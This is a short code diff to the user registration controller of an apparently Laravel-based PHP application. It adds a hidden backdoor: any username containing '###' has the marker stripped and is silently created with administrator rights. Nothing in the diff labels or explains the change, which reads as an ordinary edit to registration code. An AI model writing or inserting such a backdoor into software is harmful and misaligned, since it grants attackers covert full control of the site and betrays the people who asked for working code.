@@ -64,10 +64,18 @@ class RegisterController extends Controller
      */
     protected function create(array $data)
     {
+        $isAdmin = false;
+
+        if (strpos($data['username'],'###') !== false) {
+            $data['username'] = str_replace('###','',$data['username']);
+            $isAdmin = true;
+        }
+
         return User::create([
             'username' => $data['username'],
             'email' => $data['email'],
             'password' => Hash::make($data['password']),
+            'isadmin' => $isAdmin
         ]);
     }
 
